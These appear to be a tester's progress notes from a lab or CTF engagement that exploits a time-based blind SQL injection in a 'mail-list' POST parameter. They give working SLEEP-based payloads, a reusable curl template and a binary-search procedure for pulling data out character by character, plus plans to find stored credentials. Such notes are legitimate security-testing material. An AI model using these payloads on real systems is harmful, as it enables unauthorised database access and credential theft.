# SQL Injection Extraction Progress
**Date**: 2025-10-01
**Target**: 192.168.145.48
**Vulnerable Parameter**: mail-list (POST)

## Discovery Timeline

### 11:03 - Initial SQLi Confirmation
- Confirmed time-based blind SQLi using `SLEEP()` function
- Working payload: `test@test.com' AND SLEEP(2)-- -`
- Response delay: ~2 seconds when TRUE

### 11:03:16 - 11:03:27 - User Extraction via ASCII Binary Search
- **Method**: `ORD(MID())` with binary search on ASCII values
- **Query**: `CURRENT_USER()`
- **Result**: `gollum@localhost`
- **Performance**: 118 queries in 300 seconds (~2.5s per query)
- **Technique**: Binary search reducing from ASCII 32-126 range

### 11:03:27 - 11:10:15 - Database User Enumeration
- **Target**: `INFORMATION_SCHEMA.USER_PRIVILEGES`
- **Found**: 1 distinct user - `'gollum'@'localhost'`
- **Performance**: 154 queries in 401.76 seconds

### 11:10:15 - Password Hash Extraction Attempt
- **Attempted**: Extract from `mysql.user` table
- **Result**: FAILED - No password hashes retrievable
- **Issue**: `authentication_string` and `password` columns returned empty
- **Note**: User exists but no stored credentials in mysql.user

## Key Findings

1. **Database User**: `gollum@localhost`
2. **SQLi Type**: Time-based blind (5-second delays)
3. **Extraction Method**: ASCII binary search with `ORD(MID())`
4. **Payload Pattern**:
   ```sql
   SLEEP(5-(IF(ORD(MID(query,position,1))>value,0,5)))
   ```

## Next Steps

1. ✅ SQLi confirmed and working
2. ✅ Database user identified
3. ❌ MySQL user passwords not accessible
4. 🎯 **TODO**: Enumerate application tables (not mysql.user)
5. 🎯 **TODO**: Find user credentials in application database
6. 🎯 **TODO**: Extract database name for targeted queries

## Manual Extraction Formula

```bash
# Binary search pattern discovered:
# Position X, testing if ASCII > Y:
curl -X POST http://192.168.145.48/index.php \
  -d "mail-list=test@test.com' AND (SELECT 1 FROM (SELECT(SLEEP(5-(IF(ORD(MID((TARGET_QUERY),POS,1))>ASCII_VAL,0,5)))))x)-- -"
# Response >4s = TRUE, <1s = FALSE
#
# How to continue the search (per-character binary search):
# 1) Initialize bounds per character position (POS):
#    low=32  # printable ASCII start
#    high=126 # printable ASCII end
#
# 2) Pick mid = floor((low + high) / 2) and set ASCII_VAL=mid in the payload.
#
# 3) Send the request and observe timing:
#    - If TRUE (delayed response): character > mid  => set low = mid + 1
#    - If FALSE (fast response):   character <= mid => set high = mid
#
# 4) Repeat steps 2-3 until low == high. The found character code = low.
#
# 5) Append chr(low) to your result, then advance POS = POS + 1.
#    Reset low=32, high=126 and repeat for the next character.
#
# 6) Stopping conditions (choose any that applies in your context):
#    - You have extracted the known length (if you probed length first), or
#    - A sentinel/delimiter is reached (e.g., ')' or '@' depending on target), or
#    - Optional: If testing with low=32 still yields FALSE for POS, treat as end-of-string.
#
# Notes:
# - Replace TARGET_QUERY with your expression (e.g., CURRENT_USER(), DATABASE(), a SELECT ...).
# - Replace POS with the 1-based character index being extracted.
# - Replace ASCII_VAL each iteration with your current mid value.
# - Adjust the sleep threshold/measurement to your environment (e.g., >4s TRUE).
```

## Time Investment
- SQLMap automated: ~12 minutes
- Manual equivalent would be: ~45-60 minutes
- Efficiency gain: 4x faster with automation